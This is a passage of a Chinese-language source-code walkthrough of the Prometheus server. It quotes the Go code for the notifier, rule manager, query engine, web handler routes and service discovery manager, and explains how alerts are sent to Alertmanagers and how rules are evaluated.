__scheme__，每个实列的内容都为告警服务的URL地址。\n\nsendAll方法，发送告警到所有配置的alertmanagers，当至少一个alertmanager成功，返回成功。\n\n```go\n// sendAll sends the alerts to all configured Alertmanagers concurrently.\n// It returns true if the alerts could be sent successfully to at least one Alertmanager.\nfunc (n *Notifier) sendAll(alerts ...*Alert) bool {\n\tbegin := time.Now()\n\n\tb, err := json.Marshal(alerts)\n\tif err != nil {\n\t\tlevel.Error(n.logger).Log(\"msg\", \"Encoding alerts failed\", \"err\", err)\n\t\treturn false\n\t}\n\n\tn.mtx.RLock()\n\tamSets := n.alertmanagers\n\tn.mtx.RUnlock()\n\n\tvar (\n\t\twg         sync.WaitGroup\n\t\tnumSuccess uint64\n\t)\n\tfor _, ams := range amSets {\n\t\tams.mtx.RLock()\n\n\t\tfor _, am := range ams.ams {\n\t\t\twg.Add(1)\n\n\t\t\tctx, cancel := context.WithTimeout(n.ctx, ams.cfg.Timeout)\n\t\t\tdefer cancel()\n\n\t\t\tgo func(ams *alertmanagerSet, am alertmanager) {\n\t\t\t\tu := am.url().String()\n\n\t\t\t\tif err := n.sendOne(ctx, ams.client, u, b); err != nil {\n\t\t\t\t\tlevel.Error(n.logger).Log(\"alertmanager\", u, \"count\", len(alerts), \"msg\", \"Error sending alert\", \"err\", err)\n\t\t\t\t\tn.metrics.errors.WithLabelValues(u).Inc()\n\t\t\t\t} else {\n\t\t\t\t\tatomic.AddUint64(&numSuccess, 1)\n\t\t\t\t}\n\t\t\t\tn.metrics.latency.WithLabelValues(u).Observe(time.Since(begin).Seconds())\n\t\t\t\tn.metrics.sent.WithLabelValues(u).Add(float64(len(alerts)))\n\n\t\t\t\twg.Done()\n\t\t\t}(ams, am)\n\t\t}\n\t\tams.mtx.RUnlock()\n\t}\n    //发送告警同步等待\n\twg.Wait()\n\n\treturn numSuccess > 0\n}\n\n```\n\n使用sendOne发送告警信息，使用http请求的方式发送告警信息\n\n```go\nfunc (n *Notifier) sendOne(ctx context.Context, c *http.Client, url string, b []byte) error {\n\treq, err := http.NewRequest(\"POST\", url, bytes.NewReader(b))\n\tif err != nil {\n\t\treturn err\n\t}\n\treq.Header.Set(\"Content-Type\", contentTypeJSON)\n\tresp, err := n.opts.Do(ctx, c, req)\n\tif err != nil {\n\t\treturn err\n\t}\n\tdefer resp.Body.Close()\n\n\t// Any HTTP status 2xx is OK.\n\tif resp.StatusCode/100 != 2 {\n\t\treturn fmt.Errorf(\"bad response status %v\", resp.Status)\n\t}\n\treturn err\n}\n```\n\nnotifier流程：\n\n![1572404957636](/images/1572404957636.png)\n\n注册notifier:\n\n初始化过程中将notifier服务注册到rulemanager中，规则运算过程中触发告警，会调用注册的sendAlerts方法完成告警信息发送。\n\n告警状态分为三种：StateInactive（告警活动状态），StatePending (告警待定状态)，StateFiring(告警激活状态)。\n\n```go\n// sendAlerts implements a the rules.NotifyFunc for a Notifier.\n// It filters any non-firing alerts from the input.\nfunc sendAlerts(n *notifier.Notifier, externalURL string) rules.NotifyFunc {\n\treturn func(ctx context.Context, expr string, alerts ...*rules.Alert) error {\n\t\tvar res []*notifier.Alert\n\n\t\tfor _, alert := range alerts {\n\t\t\t// Only send actually firing alerts.\n\t\t\tif alert.State == rules.StatePending {\n\t\t\t\tcontinue\n\t\t\t}\n\t\t\ta := &notifier.Alert{\n\t\t\t\tStartsAt:     alert.FiredAt,\n\t\t\t\tLabels:       alert.Labels,\n\t\t\t\tAnnotations:  alert.Annotations,\n\t\t\t\tGeneratorURL: externalURL + strutil.TableLinkForExpression(expr),\n\t\t\t}\n\t\t\tif !alert.ResolvedAt.IsZero() {\n\t\t\t\ta.EndsAt = alert.ResolvedAt\n\t\t\t}\n\t\t\tres = append(res, a)\n\t\t}\n\n\t\tif len(alerts) > 0 {\n\t\t\tn.Send(res...)\n\t\t}\n\t\treturn nil\n\t}\n}\n```\n\n告警信息alerts通过notifier.Send方法添加到告警队列中，在添加之前需要对告警信息的label进行扩展和重置。\n\n```go\n// Send queues the given notification requests for processing.\n// Panics if called on a handler that is not running.\nfunc (n *Notifier) Send(alerts ...*Alert) {\n\tn.mtx.Lock()\n\tdefer n.mtx.Unlock()\n\n\t// Attach external labels before relabelling and sending.\n\tfor _, a := range alerts {\n\t\tlb := labels.NewBuilder(a.Labels)\n\n\t\tfor ln, lv := range n.opts.ExternalLabels {\n\t\t\tif a.Labels.Get(string(ln)) == \"\" {\n\t\t\t\tlb.Set(string(ln), string(lv))\n\t\t\t}\n\t\t}\n\n\t\ta.Labels = lb.Labels()\n\t}\n\n\talerts = n.relabelAlerts(alerts)\n\n\t// Queue capacity should be significantly larger than a single alert\n\t// batch could be.\n\tif d := len(alerts) - n.opts.QueueCapacity; d > 0 {\n\t\talerts = alerts[d:]\n\n\t\tlevel.Warn(n.logger).Log(\"msg\", \"Alert batch larger than queue capacity, dropping alerts\", \"num_dropped\", d)\n\t\tn.metrics.dropped.Add(float64(d))\n\t}\n\n\t// If the queue is full, remove the oldest alerts in favor\n\t// of newer ones.\n\tif d := (len(n.queue) + len(alerts)) - n.opts.QueueCapacity; d > 0 {\n\t\tn.queue = n.queue[d:]\n\n\t\tlevel.Warn(n.logger).Log(\"msg\", \"Alert notification queue full, dropping alerts\", \"num_dropped\", d)\n\t\tn.metrics.dropped.Add(float64(d))\n\t}\n\tn.queue = append(n.queue, alerts...)\n\n\t// Notify sending goroutine that there are alerts to be processed.\n\tn.setMore()\n}\n```\n\n主要的流程图：\n\n![1572406923577](/images/1572406923577.png)\n\n\n\n## RuleManager\n\nruleManager在prometheus初始化阶段调用rules.NewManager方法完成构建，ruleManager为Manager类型：\n\n```go\n// The Manager manages recording and alerting rules.\ntype Manager struct {\n\topts   *ManagerOptions\n\tgroups map[string]*Group\n\tmtx    sync.RWMutex\n\tblock  chan struct{}\n\n\tlogger log.Logger\n}\n```\n\ngroups为map[string]*Group类型，key为规则组名，Group为具体的规则信息。\n\nGroup结构定义如下：\n\n```go\n// Group is a set of rules that have a logical relation.\ntype Group struct {\n\tname                 string\n\tfile                 string\n\tinterval             time.Duration\n\trules                []Rule\n\tseriesInPreviousEval []map[string]labels.Labels // One per Rule.\n\topts                 *ManagerOptions\n\tevaluationTime       time.Duration\n\tmtx                  sync.Mutex\n\n\tdone       chan struct{}\n\tterminated chan struct{}\n\n\tlogger log.Logger\n}\n```\n\n更新规则：\n\n```go\n// Update the rule manager's state as the config requires. If\n// loading the new rules failed the old rule set is restored.\nfunc (m *Manager) Update(interval time.Duration, files []string) error {\n\tm.mtx.Lock()\n\tdefer m.mtx.Unlock()\n\n\t// To be replaced with a configurable per-group interval.\n\tgroups, errs := m.loadGroups(interval, files...)\n\tif errs != nil {\n\t\tfor _, e := range errs {\n\t\t\tlevel.Error(m.logger).Log(\"msg\", \"loading groups failed\", \"err\", e)\n\t\t}\n\t\treturn errors.New(\"error loading rules, previous rule set restored\")\n\t}\n\n\tvar wg sync.WaitGroup\n\n\tfor _, newg := range groups {\n\t\twg.Add(1)\n\n\t\t// If there is an old group with the same identifier, stop it and wait for\n\t\t// it to finish the current iteration. Then copy it into the new group.\n\t\tgn := groupKey(newg.name, newg.file)\n\t\toldg, ok := m.groups[gn]\n\t\tdelete(m.groups, gn)\n\n\t\tgo func(newg *Group) {\n\t\t\tif ok {\n\t\t\t\toldg.stop()\n\t\t\t\tnewg.copyState(oldg)\n\t\t\t}\n\t\t\tgo func() {\n\t\t\t\t// Wait with starting evaluation until the rule manager\n\t\t\t\t// is told to run. This is necessary to avoid running\n\t\t\t\t// queries against a bootstrapping storage.\n\t\t\t\t<-m.block\n\t\t\t\tnewg.run(m.opts.Context)\n\t\t\t}()\n\t\t\twg.Done()\n\t\t}(newg)\n\t}\n\n\t// Stop remaining old groups.\n\tfor _, oldg := range m.groups {\n\t\toldg.stop()\n\t}\n\n\twg.Wait()\n\tm.groups = groups\n\n\treturn nil\n}\n```\n\n 规则组状态复制Group.copyState指从源规则组中，将与目标规则组相同规则名称下的指标赋值给对应的目标规则，将源规则组处于活跃状态下的指标赋值到目标规则组的活跃区域。\n\n```go\n// copyState copies the alerting rule and staleness related state from the given group.\n//\n// Rules are matched based on their name. If there are duplicates, the\n// first is matched with the first, second with the second etc.\nfunc (g *Group) copyState(from *Group) {\n\tg.evaluationTime = from.evaluationTime\n\n\truleMap := make(map[string][]int, len(from.rules))\n\n\tfor fi, fromRule := range from.rules {\n\t\tl, _ := ruleMap[fromRule.Name()]\n\t\truleMap[fromRule.Name()] = append(l, fi)\n\t}\n\n\tfor i, rule := range g.rules {\n\t\tindexes, _ := ruleMap[rule.Name()]\n\t\tif len(indexes) == 0 {\n\t\t\tcontinue\n\t\t}\n\t\tfi := indexes[0]\n\t\tg.seriesInPreviousEval[i] = from.seriesInPreviousEval[fi]\n\t\truleMap[rule.Name()] = indexes[1:]\n\n\t\tar, ok := rule.(*AlertingRule)\n\t\tif !ok {\n\t\t\tcontinue\n\t\t}\n\t\tfar, ok := from.rules[fi].(*AlertingRule)\n\t\tif !ok {\n\t\t\tcontinue\n\t\t}\n\n\t\tfor fp, a := range far.active {\n\t\t\tar.active[fp] = a\n\t\t}\n\t}\n}\n```\n\n规则组启动流程：进入 run  方法后先进行初始化等待，以使得规则运算的时间间隔interval对齐。定义规则运算调度方法iter, 调度收起interval指定；iter方法中调用eval方法。\n\n```go\nfunc (g *Group) run(ctx context.Context) {\n\tdefer close(g.terminated)\n\n\t// Wait an initial amount to have consistently slotted intervals.\n\tselect {\n\tcase <-time.After(g.offset()):\n\tcase <-g.done:\n\t\treturn\n\t}\n\n\titer := func() {\n\t\titerationsScheduled.Inc()\n\n\t\tstart := time.Now()\n\t\tg.Eval(ctx, start)\n\n\t\titerationDuration.Observe(time.Since(start).Seconds())\n\t\tg.SetEvaluationTime(time.Since(start))\n\t}\n\tlastTriggered := time.Now()\n\titer()\n\n\ttick := time.NewTicker(g.interval)\n\tdefer tick.Stop()\n\n\tfor {\n\t\tselect {\n\t\tcase <-g.done:\n\t\t\treturn\n\t\tdefault:\n\t\t\tselect {\n\t\t\tcase <-g.done:\n\t\t\t\treturn\n\t\t\tcase <-tick.C:\n\t\t\t\tmissed := (time.Since(lastTriggered).Nanoseconds() / g.interval.Nanoseconds()) - 1\n\t\t\t\tif missed > 0 {\n\t\t\t\t\titerationsMissed.Add(float64(missed))\n\t\t\t\t\titerationsScheduled.Add(float64(missed))\n\t\t\t\t}\n\t\t\t\tlastTriggered = time.Now()\n\t\t\t\titer()\n\t\t\t}\n\t\t}\n\t}\n}\n```\n\n规则组的调度在Eval中实现，Eval方法会将规则组中的每个规则一次放到queryEngine中执行，如果呗执行的规则是AlertingRule类型，执行后结果指标会通过notifier组件发送给告警服务，最后将结果指标存储到prometheus的存储管理器，并对过期指标进行存储标记处理。\n\n```go\n// Eval runs a single evaluation cycle in which all rules are evaluated sequentially.\nfunc (g *Group) Eval(ctx context.Context, ts time.Time) {\n\tfor i, rule := range g.rules {\n\t\tselect {\n\t\tcase <-g.done:\n\t\t\treturn\n\t\tdefault:\n\t\t}\n\n\t\tfunc(i int, rule Rule) {\n\t\t\tdefer func(t time.Time) {\n\t\t\t\tevalDuration.Observe(time.Since(t).Seconds())\n\t\t\t\trule.SetEvaluationTime(time.Since(t))\n\t\t\t}(time.Now())\n\n\t\t\tevalTotal.Inc()\n\n\t\t\tvector, err := rule.Eval(ctx, ts, g.opts.QueryFunc, g.opts.ExternalURL)\n\t\t\tif err != nil {\n\t\t\t\t// Canceled queries are intentional termination of queries. This normally\n\t\t\t\t// happens on shutdown and thus we skip logging of any errors here.\n\t\t\t\tif _, ok := err.(promql.ErrQueryCanceled); !ok {\n\t\t\t\t\tlevel.Warn(g.logger).Log(\"msg\", \"Evaluating rule failed\", \"rule\", rule, \"err\", err)\n\t\t\t\t}\n\t\t\t\tevalFailures.Inc()\n\t\t\t\treturn\n\t\t\t}\n\n\t\t\tif ar, ok := rule.(*AlertingRule); ok {\n\t\t\t\tg.opts.NotifyFunc(ctx, ar.vector.String(), ar.currentAlerts()...)\n\t\t\t}\n\t\t\tvar (\n\t\t\t\tnumOutOfOrder = 0\n\t\t\t\tnumDuplicates = 0\n\t\t\t)\n\n\t\t\tapp, err := g.opts.Appendable.Appender()\n\t\t\tif err != nil {\n\t\t\t\tlevel.Warn(g.logger).Log(\"msg\", \"creating appender failed\", \"err\", err)\n\t\t\t\treturn\n\t\t\t}\n\n\t\t\tseriesReturned := make(map[string]labels.Labels, len(g.seriesInPreviousEval[i]))\n\t\t\tfor _, s := range vector {\n\t\t\t\tif _, err := app.Add(s.Metric, s.T, s.V); err != nil {\n\t\t\t\t\tswitch err {\n\t\t\t\t\tcase storage.ErrOutOfOrderSample:\n\t\t\t\t\t\tnumOutOfOrder++\n\t\t\t\t\t\tlevel.Debug(g.logger).Log(\"msg\", \"Rule evaluation result discarded\", \"err\", err, \"sample\", s)\n\t\t\t\t\tcase storage.ErrDuplicateSampleForTimestamp:\n\t\t\t\t\t\tnumDuplicates++\n\t\t\t\t\t\tlevel.Debug(g.logger).Log(\"msg\", \"Rule evaluation result discarded\", \"err\", err, \"sample\", s)\n\t\t\t\t\tdefault:\n\t\t\t\t\t\tlevel.Warn(g.logger).Log(\"msg\", \"Rule evaluation result discarded\", \"err\", err, \"sample\", s)\n\t\t\t\t\t}\n\t\t\t\t} else {\n\t\t\t\t\tseriesReturned[s.Metric.String()] = s.Metric\n\t\t\t\t}\n\t\t\t}\n\t\t\tif numOutOfOrder > 0 {\n\t\t\t\tlevel.Warn(g.logger).Log(\"msg\", \"Error on ingesting out-of-order result from rule evaluation\", \"numDropped\", numOutOfOrder)\n\t\t\t}\n\t\t\tif numDuplicates > 0 {\n\t\t\t\tlevel.Warn(g.logger).Log(\"msg\", \"Error on ingesting results from rule evaluation with different value but same timestamp\", \"numDropped\", numDuplicates)\n\t\t\t}\n\n\t\t\tfor metric, lset := range g.seriesInPreviousEval[i] {\n\t\t\t\tif _, ok := seriesReturned[metric]; !ok {\n\t\t\t\t\t// Series no longer exposed, mark it stale.\n\t\t\t\t\t_, err = app.Add(lset, timestamp.FromTime(ts), math.Float64frombits(value.StaleNaN))\n\t\t\t\t\tswitch err {\n\t\t\t\t\tcase nil:\n\t\t\t\t\tcase storage.ErrOutOfOrderSample, storage.ErrDuplicateSampleForTimestamp:\n\t\t\t\t\t\t// Do not count these in logging, as this is expected if series\n\t\t\t\t\t\t// is exposed from a different rule.\n\t\t\t\t\tdefault:\n\t\t\t\t\t\tlevel.Warn(g.logger).Log(\"msg\", \"adding stale sample failed\", \"sample\", metric, \"err\", err)\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\tif err := app.Commit(); err != nil {\n\t\t\t\tlevel.Warn(g.logger).Log(\"msg\", \"rule sample appending failed\", \"err\", err)\n\t\t\t} else {\n\t\t\t\tg.seriesInPreviousEval[i] = seriesReturned\n\t\t\t}\n\t\t}(i, rule)\n\t}\n}\n```\n\n规则调度的流程：\n\n![1572412222861](/images/1572412222861.png)\n\n## QueryEngine\n\nqueryengine是核心模块，规则分为告警规则和记录规则，告警规则会产生告警信息，通过通知组件发送给告警服务，告警规则的计算表达式可以引用记录规则。\n\nRule接口：\n\n```go\n// A Rule encapsulates a vector expression which is evaluated at a specified\n// interval and acted upon (currently either recorded or used for alerting).\ntype Rule interface {\n\tName() string\n\t// eval evaluates the rule, including any associated recording or alerting actions.\n\tEval(context.Context, time.Time, QueryFunc, *url.URL) (promql.Vector, error)\n\t// String returns a human-readable string representation of the rule.\n\tString() string\n\n\tSetEvaluationTime(time.Duration)\n\tGetEvaluationTime() time.Duration\n\t// HTMLSnippet returns a human-readable string representation of the rule,\n\t// decorated with HTML elements for use the web frontend.\n\tHTMLSnippet(pathPrefix string) html_template.HTML\n}\n```\n\n两种规则都是通过实现Rule接口中的Eval方法来完成。\n\n1）告警状态为StatePending时候，告警持续时间必须大于等于告警规则所配置的持续时间。\n\n2）告警状态为StateFiring\n\n告警规则和记录规则Eval方法的实现代码路径为rules/alerting和reording.go\n\n查询引擎通过EngineQueryFunc方法完成了在RuleManager中的注册。\n\n```go\n// QueryFunc processes PromQL queries.\ntype QueryFunc func(ctx context.Context, q string, t time.Time) (promql.Vector, error)\n```\n\n规则在查询引擎中运算之前，需要调用Engine.NewInstantQuery方法初始化，完成对规则的解析和对查询器的构建。\n\n```go\n// NewInstantQuery returns an evaluation query for the given expression at the given time.\nfunc (ng *Engine) NewInstantQuery(qs string, ts time.Time) (Query, error) {\n\texpr, err := ParseExpr(qs)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tqry := ng.newQuery(expr, ts, ts, 0)\n\tqry.q = qs\n\n\treturn qry, nil\n}\n```\n\n规则允许的调用链为:\n\nquery.Exec->Engine.exec->Engine.execEvalStmt->evaluator.eval。最为关键的部分在evaluator.eval方法中实现。\n\n支持的表达式类型：\n\n```\nAggregateExpr\nBinaryExpr\nCall\nMatrixSelector\nNumberLiteral\nParenExpr\nStringLiteral\nUnaryExpr\nVectorSelector\n```\n\nenginequery模块主要代码在promql目录下；\n\nast.go定义查询引擎中常用的结构\n\nengine.go具体实现\n\nfunctions.go实现查询引擎的内置方法\n\nfuzz.go，parse.go实现两种各不同的表达式解析器\n\nprinter.go, quantile.go, value.go 查询引擎的公共基础方法\n\nBinaryExpr运算：\n\n![1572413062094](/images/1572413062094.png)\n\n时间窗口规则运算：\n\n![1572413083570](/images/1572413083570.png)\n\n规则计算和指标查询：\n\n查询引擎在规则运算过程中，先对规则进行解析，然后解析后的规则转换成为对应类型的表达式，最后根据转换后的表达式和数据完成规则计算。\n\n查询引擎是通过调用读写代理器fanoutStorage中的Querier方法获取指标数据的。 Querier方法的主要参数为指标名称，开始时间和结束时间。\n\n加入指标查询后的规则运算调用链为： query.Exec=>Engine.Exec=>Engine.execEvalStat=>Engine.populateIterators=>Engine.queryable.Querier=>evaluator.eval\n\n## Web\n\nweb组件引用了localStorage组件，fanoutStorage组件，scrapeManager组件，ruleManager组件和notifier组件，对外提供http服务。\n\nprometheus server服务的handler的数据结构如下：\n\n```go\n// Handler serves various HTTP endpoints of the Prometheus server\ntype Handler struct {\n\tlogger log.Logger\n\n\tscrapeManager *retrieval.ScrapeManager\n\truleManager   *rules.Manager\n\tqueryEngine   *promql.Engine\n\tcontext       context.Context\n\ttsdb          func() *tsdb.DB\n\tstorage       storage.Storage\n\tnotifier      *notifier.Notifier\n\n\tapiV1 *api_v1.API\n\n\trouter       *route.Router\n\tquitCh       chan struct{}\n\treloadCh     chan chan error\n\toptions      *Options\n\tconfig       *config.Config\n\tconfigString string\n\tversionInfo  *PrometheusVersion\n\tbirth        time.Time\n\tcwd          string\n\tflagsMap     map[string]string\n\n\texternalLabels model.LabelSet\n\tmtx            sync.RWMutex\n\tnow            func() model.Time\n\n\tready uint32 // ready is uint32 rather than boolean to be able to use atomic functions.\n}\n```\n\nweb初始化再main中：\n\n```go\nwebHandler := web.New(log.With(logger, \"component\", \"web\"), &cfg.web)\n```\n\n注册api接口：\n\n```go\nfunc New(logger log.Logger, o *Options) *Handler {\n\trouter := route.New()\n\tcwd, err := os.Getwd()\n\n\tif err != nil {\n\t\tcwd = \"<error retrieving current working directory>\"\n\t}\n\tif logger == nil {\n\t\tlogger = log.NewNopLogger()\n\t}\n\n\th := &Handler{\n\t\tlogger:      logger,\n\t\trouter:      router,\n\t\tquitCh:      make(chan struct{}),\n\t\treloadCh:    make(chan chan error),\n\t\toptions:     o,\n\t\tversionInfo: o.Version,\n\t\tbirth:       time.Now(),\n\t\tcwd:         cwd,\n\t\tflagsMap:    o.Flags,\n\n\t\tcontext:       o.Context,\n\t\tscrapeManager: o.ScrapeManager,\n\t\truleManager:   o.RuleManager,\n\t\tqueryEngine:   o.QueryEngine,\n\t\ttsdb:          o.TSDB,\n\t\tstorage:       o.Storage,\n\t\tnotifier:      o.Notifier,\n\n\t\tnow: model.Now,\n\n\t\tready: 0,\n\t}\n\n\th.apiV1 = api_v1.NewAPI(h.queryEngine, h.storage, h.scrapeManager, h.notifier,\n\t\tfunc() config.Config {\n\t\t\th.mtx.RLock()\n\t\t\tdefer h.mtx.RUnlock()\n\t\t\treturn *h.config\n\t\t},\n\t\th.testReady,\n\t\th.options.TSDB,\n\t\th.options.EnableAdminAPI,\n\t)\n\n\tif o.RoutePrefix != \"/\" {\n\t\t// If the prefix is missing for the root path, prepend it.\n\t\trouter.Get(\"/\", func(w http.ResponseWriter, r *http.Request) {\n\t\t\thttp.Redirect(w, r, o.RoutePrefix, http.StatusFound)\n\t\t})\n\t\trouter = router.WithPrefix(o.RoutePrefix)\n\t}\n\n\tinstrh := prometheus.InstrumentHandler\n\tinstrf := prometheus.InstrumentHandlerFunc\n\treadyf := h.testReady\n\n\trouter.Get(\"/\", func(w http.ResponseWriter, r *http.Request) {\n\t\thttp.Redirect(w, r, path.Join(o.ExternalURL.Path, \"/graph\"), http.StatusFound)\n\t})\n\n\trouter.Get(\"/alerts\", readyf(instrf(\"alerts\", h.alerts)))   //alerts信息\n\trouter.Get(\"/graph\", readyf(instrf(\"graph\", h.graph)))      //graph接口\n\trouter.Get(\"/status\", readyf(instrf(\"status\", h.status)))    //status状态\n\trouter.Get(\"/flags\", readyf(instrf(\"flags\", h.flags)))\n\trouter.Get(\"/config\", readyf(instrf(\"config\", h.serveConfig)))\n\trouter.Get(\"/rules\", readyf(instrf(\"rules\", h.rules)))      //rules\n\trouter.Get(\"/targets\", readyf(instrf(\"targets\", h.targets))) // Bucket targets by job label\n\trouter.Get(\"/version\", readyf(instrf(\"version\", h.version)))\n\trouter.Get(\"/service-discovery\", readyf(instrf(\"servicediscovery\", h.serviceDiscovery)))\n\t//服务发现\n\trouter.Get(\"/heap\", instrf(\"heap\", h.dumpHeap))\n\n\trouter.Get(\"/metrics\", prometheus.Handler().ServeHTTP)\n\t//当前所有指标数据\n\trouter.Get(\"/federate\", readyf(instrh(\"federate\", httputil.CompressionHandler{\n\t\tHandler: http.HandlerFunc(h.federation),\n\t})))\n\n\trouter.Get(\"/consoles/*filepath\", readyf(instrf(\"consoles\", h.consoles)))\n\n\trouter.Get(\"/static/*filepath\", instrf(\"static\", h.serveStaticAsset))\n\n\tif o.UserAssetsPath != \"\" {\n\t\trouter.Get(\"/user/*filepath\", instrf(\"user\", route.FileServe(o.UserAssetsPath)))\n\t}\n\n\tif o.EnableLifecycle {\n\t\trouter.Post(\"/-/quit\", h.quit)\n\t\trouter.Post(\"/-/reload\", h.reload)\n\t} else {\n\t\trouter.Post(\"/-/quit\", func(w http.ResponseWriter, _ *http.Request) {\n\t\t\tw.WriteHeader(http.StatusForbidden)\n\t\t\tw.Write([]byte(\"Lifecycle APIs are not enabled\"))\n\t\t})\n\t\trouter.Post(\"/-/reload\", func(w http.ResponseWriter, _ *http.Request) {\n\t\t\tw.WriteHeader(http.StatusForbidden)\n\t\t\tw.Write([]byte(\"Lifecycle APIs are not enabled\"))\n\t\t})\n\t}\n\trouter.Get(\"/-/quit\", func(w http.ResponseWriter, _ *http.Request) {\n\t\tw.WriteHeader(http.StatusMethodNotAllowed)\n\t\tw.Write([]byte(\"Only POST requests allowed\"))\n\t})\n\trouter.Get(\"/-/reload\", func(w http.ResponseWriter, _ *http.Request) {\n\t\tw.WriteHeader(http.StatusMethodNotAllowed)\n\t\tw.Write([]byte(\"Only POST requests allowed\"))\n\t})\n\n\trouter.Get(\"/debug/*subpath\", serveDebug)\n\trouter.Post(\"/debug/*subpath\", serveDebug)\n\n\trouter.Get(\"/-/healthy\", func(w http.ResponseWriter, r *http.Request) {\n\t\tw.WriteHeader(http.StatusOK)\n\t\tfmt.Fprintf(w, \"Prometheus is Healthy.\\n\")\n\t})\n\trouter.Get(\"/-/ready\", readyf(func(w http.ResponseWriter, r *http.Request) {\n\t\tw.WriteHeader(http.StatusOK)\n\t\tfmt.Fprintf(w, \"Prometheus is Ready.\\n\")\n\t}))\n\n\treturn h\n}\n```\n\nreload接口调用发送信号给reloadCh，重新加载配置。web主要内容就这些。\n\n## DiscoveryManager\n\n数据采集之前，prometheus需要先发现数据采集的目标服务，然后从目标服务中获取指标数据，最后将指标数据存储到prometheus存储管理器中。\n\n服务发现结构配置：\n\n```go\n\n// ServiceDiscoveryConfig configures lists of different service discovery mechanisms.\ntype ServiceDiscoveryConfig struct {\n\t// List of labeled target groups for this job.\n\tStaticConfigs []*targetgroup.Group `yaml:\"static_configs,omitempty\"`\n\t// List of DNS service discovery configurations.\n\tDNSSDConfigs []*dns.SDConfig `yaml:\"dns_sd_configs,omitempty\"`\n\t// List of file service discovery configurations.\n\tFileSDConfigs []*file.SDConfig `yaml:\"file_sd_configs,omitempty\"`\n\t// List of Consul service discovery configurations.\n\tConsulSDConfigs []*consul.SDConfig `yaml:\"consul_sd_configs,omitempty\"`\n\t// List of Serverset service discovery configurations.\n\tServersetSDConfigs []*zookeeper.ServersetSDConfig `yaml:\"serverset_sd_configs,omitempty\"`\n\t// NerveSDConfigs is a list of Nerve service discovery configurations.\n\tNerveSDConfigs []*zookeeper.NerveSDConfig `yaml:\"nerve_sd_configs,omitempty\"`\n\t// MarathonSDConfigs is a list of Marathon service discovery configurations.\n\tMarathonSDConfigs []*marathon.SDConfig `yaml:\"marathon_sd_configs,omitempty\"`\n\t// List of Kubernetes service discovery configurations.\n\tKubernetesSDConfigs []*kubernetes.SDConfig `yaml:\"kubernetes_sd_configs,omitempty\"`\n\t// List of GCE service discovery configurations.\n\tGCESDConfigs []*gce.SDConfig `yaml:\"gce_sd_configs,omitempty\"`\n\t// List of EC2 service discovery configurations.\n\tEC2SDConfigs []*ec2.SDConfig `yaml:\"ec2_sd_configs,omitempty\"`\n\t// List of OpenStack service discovery configurations.\n\tOpenstackSDConfigs []*openstack.SDConfig `yaml:\"openstack_sd_configs,omitempty\"`\n\t// List of Azure service discovery configurations.\n\tAzureSDConfigs []*azure.SDConfig `yaml:\"azure_sd_configs,omitempty\"`\n\t// List of Triton service discovery configurations.\n\tTritonSDConfigs []*triton.SDConfig `yaml:\"triton_sd_configs,omitempty\"`\n\n\t// Catches all undefined fields and must be empty after parsing.\n\tXXX map[string]interface{} `yaml:\",inline\"`\n}\n```\n\nprometheus支持以上服务，除了StaticConfigs静态服务配置，其他都是动态的服务配置。\n\n对所有的服务发现，都提供一个抽象接口：\n\n```go\ntype Discoverer interface {\n\t// Run hands a channel to the discovery provider(consul,dns etc) through which it can send\n\t// updated target groups.\n\t// Must returns if the context gets canceled. It should not close the update\n\t// channel on returning.\n\tRun(ctx context.Context, up chan<- []*targetgroup.Group)\n}\n```\n\nprometheus将所发现的服务都转换成为了targetGroup.Group结构，通过 up发送给ScrapeManager，完成服务上线。\n\n代码路径：/discovery/targetgroup/targetgroup.go\n\n```go\n// Group is a set of targets with a common label set(production , test, staging etc.).\ntype Group struct {\n\t// Targets is a list of targets identified by a label set. Each target is\n\t// uniquely identifiable in the group by its address label.\n\tTargets []model.LabelSet\n\t// Labels is a set of labels that is common across all targets in the group.\n\tLabels model.LabelSet\n\n\t// Source is an identifier that describes a group of targets.\n\tSource string\n}\n```\n\n服务发现管理者Manager是所有发现服务的入口，服务的上线，下线和更新都需要进行服务同步。\n\nManager的结构：\n\n```go\n/ Manager maintains a set of discovery providers and sends each update to a map channel.\n// Targets are grouped by the target set name.\ntype Manager struct {\n\tlogger         log.Logger  //系统日志记录\n\tmtx            sync.RWMutex  //同步读写锁\n\tctx            context.Context  //协同控制\n\tdiscoverCancel []context.CancelFunc //服务下线调用\n\t// Some Discoverers(eg. k8s) send only the updates for a given target group\n\t// so we use map[tg.Source]*targetgroup.Group to know which group to update.\n    //发现的目标服务\n\ttargets map[poolKey]map[string]*targetgroup.Group\n\t// The sync channels sends the updates in map[targetSetName] where targetSetName is the job value from the scrape config.\n    //将所发现的目标服务以chan的方式通知接受方\n\tsyncCh chan map[string][]*targetgroup.Group\n}\n```\n\n在初始化的过程中给，构建discoveryManagerScrape，并通过调用applyConfig方法完成对Discoverer的构建。\n\n```go\n// ApplyConfig removes all running discovery providers and starts new ones using the provided config.\nfunc (m *Manager) ApplyConfig(cfg map[string]sd_config.ServiceDiscoveryConfig) error {\n\tm.mtx.Lock()\n\tdefer m.mtx.Unlock()\n\n\tm.cancelDiscoverers()\n\tfor name, scfg := range cfg {\n\t\tfor provName, prov := range m.providersFromConfig(scfg) {\n\t\t\tm.startProvider(m.ctx, poolKey{setName: name, provider: provName}, prov)\n\t\t}\n\t}\n\n\treturn nil\n}\n```\n\nstartProvider方法根据job_name，服务名称和具体的Discoverer实例启动所发现的scrape服务。\n\n```go\nfunc (m *Manager) providersFromConfig(cfg sd_config.ServiceDiscoveryConfig) map[string]Discoverer {\n\tproviders := map[string]Discoverer{}\n\n\tapp := func(mech string, i int, tp Discoverer) {\n\t\tproviders[fmt.Sprintf(\"%s/%d\", mech, i)] = tp\n\t}\n\n\tfor i, c := range cfg.DNSSDConfigs {\n\t\tapp(\"dns\", i, dns.NewDiscovery(*c, log.With(m.logger, \"discovery\", \"dns\")))\n\t}\n\tfor i, c := range cfg.FileSDConfigs {\n\t\tapp(\"file\", i, file.NewDiscovery(c, log.With(m.logger, \"discovery\", \"file\")))\n\t}\n\tfor i, c := range cfg.ConsulSDConfigs {\n\t\tk, err := consul.NewDiscovery(c, log.With(m.logger, \"discovery\", \"consul\"))\n\t\tif err != nil {\n\t\t\tlevel.Error(m.logger).Log(\"msg\", \"Cannot create Consul discovery\", \"err\", err)\n\t\t\tcontinue\n\t\t}\n\t\tapp(\"consul\", i, k)\n\t}\n\tfor i, c := range cfg.MarathonSDConfigs {\n\t\tt, err := marathon.NewDiscovery(*c, log.With(m.logger, \"discovery\", 